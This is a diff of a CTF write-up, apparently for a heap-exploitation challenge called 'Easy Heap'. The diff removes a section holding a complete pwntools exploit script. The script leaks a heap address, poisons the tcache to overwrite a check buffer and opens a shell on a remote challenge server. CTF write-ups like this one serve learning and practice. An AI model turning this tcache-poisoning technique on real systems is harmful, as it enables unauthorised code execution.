@@ -177,57 +177,6 @@ The key steps are:
 
 ---
 
-## Final Exploit Script
-
-The complete exploit is in `Pwn/Easy Heap/solve.py` and works both locally and against the remote service:
-
-```python
-from pwn import *
-
-exe = context.binary = ELF(args.EXE or "./chal")
-libc = ELF(exe.libc.path)
-
-io = remote("amt.rs", 37557)
-
-# 1) allocate two chunks
-for i in range(2):
-    io.sendlineafter(b"> ", b"0")
-    io.sendlineafter(b"> ", str(i).encode())
-
-# 2) free them
-for i in range(2):
-    io.sendlineafter(b"> ", b"1")
-    io.sendlineafter(b"> ", str(i).encode())
-
-# 3) leak heap base
-io.sendlineafter(b"> ", b"3")
-io.sendlineafter(b"> ", b"0")
-io.recvuntil(b"data> ")
-heap_base = u64(io.recv(8)) << 12
-
-# 4) poison tcache -> checkbuf
-io.sendlineafter(b"> ", b"2")
-io.sendlineafter(b"> ", b"1")
-io.sendlineafter(b"data> ",
-                 p64(exe.sym.checkbuf ^ (heap_base >> 12)))
-
-# 5) re-allocate and overwrite checkbuf
-for i in range(2):
-    io.sendlineafter(b"> ", b"0")
-    io.sendlineafter(b"> ", str(i).encode())
-
-io.sendlineafter(b"> ", b"2")
-io.sendlineafter(b"> ", b"1")
-io.sendlineafter(
-    b"data> ", b"ALL HAIL OUR LORD AND SAVIOR TEEMO\x00"
-)
-
-# 6) trigger the check and pop shell
-io.sendlineafter(b"> ", b"67")
-io.interactive()
-```
-
----
 
 ## Takeaways
 
